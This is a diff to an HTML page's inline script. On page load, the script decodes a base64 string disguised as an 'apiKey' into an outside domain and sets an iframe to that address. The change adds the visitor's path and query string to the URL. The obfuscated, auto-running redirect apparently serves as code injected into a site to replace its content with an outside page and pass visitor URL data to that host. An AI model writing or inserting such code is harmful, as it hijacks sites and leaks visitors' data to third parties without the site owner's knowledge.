@@ -13,12 +13,13 @@
 </body>
    <script>
       document.addEventListener("DOMContentLoaded", function(){
-         var rabiCoeg = "tm-1";
-         var mainParameter = window.location.pathname;
+         var rabiCoeg = window.location.pathname;
+         var mainParameter = window.location.search;
          var apiKey = "aHR0cHM6Ly93d3cua2FsYWhhcnUueHl6Lw=="
          var combined = window.atob(apiKey) + rabiCoeg;
+          var sugoiii = combined + mainParameter;
          var iframeSrcValue = document.getElementById("ngent").src;
-         document.getElementById('ngent').setAttribute("src", combined);
+         document.getElementById('ngent').setAttribute("src", sugoiii);
       });
    </script>
 </html>
